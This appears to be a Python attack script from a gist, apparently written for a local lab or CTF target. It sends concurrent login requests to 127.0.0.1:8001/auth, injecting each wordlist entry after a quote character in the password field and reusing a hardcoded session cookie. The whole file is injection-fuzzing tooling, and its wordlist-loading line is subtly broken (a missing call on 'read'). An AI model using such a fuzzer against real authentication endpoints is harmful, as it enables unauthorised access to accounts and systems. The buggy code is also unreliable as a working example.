# https://gist.githubusercontent.com/ajxchapman/b7baca094e61ff120c44379029646b97/raw/4ca6f8a1c258342416535f7a309498a62a27c06b/httplib.py

import asyncio
import hashlib
import sys
from itertools import islice

import aiohttp

async def fetch(session, param):
    async with session.post("http://127.0.0.1:8001/auth", data={"password" : "passpass'{}".format(param)}, headers={"Cookie" : "session=eyJsb2dnZWRJbiI6dHJ1ZX0.XHz3fg.0GiYMyEbLR9iGTVWnsfMYareK5s"}) as response:
        body = await response.read()
        return param, response, body

def tasks(session, wordlist):
    for word in wordlist:
        yield fetch(session, word)

def limited_as_completed(coros, limit=50, wait=0.001):
    """
    https://www.artificialworlds.net/blog/2017/06/12/making-100-million-requests-with-python-aiohttp/
    """
    futures = [
        asyncio.ensure_future(c)
        for c in islice(coros, 0, limit)
    ]
    async def first_to_finish():
        while True:
            await asyncio.sleep(wait)
            for f in futures:
                if f.done():
                    futures.remove(f)
                    try:
                        newf = next(coros)
                        futures.append(
                            asyncio.ensure_future(newf))
                    except StopIteration as e:
                        pass
                    return f.result()
    while len(futures) > 0:
        yield first_to_finish()

async def main(tasks, wordlist):
    async with aiohttp.ClientSession() as session:
        for res in limited_as_completed(tasks(session, wordlist), 100):
            param, response, body = await res
            print("{} {} {}".format(repr(param), response.status, body))

if __name__ == "__main__":
    with open(sys.argv[1], "r") as f:
        wordlist = f.read.splitlines()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main(tasks, wordlist))
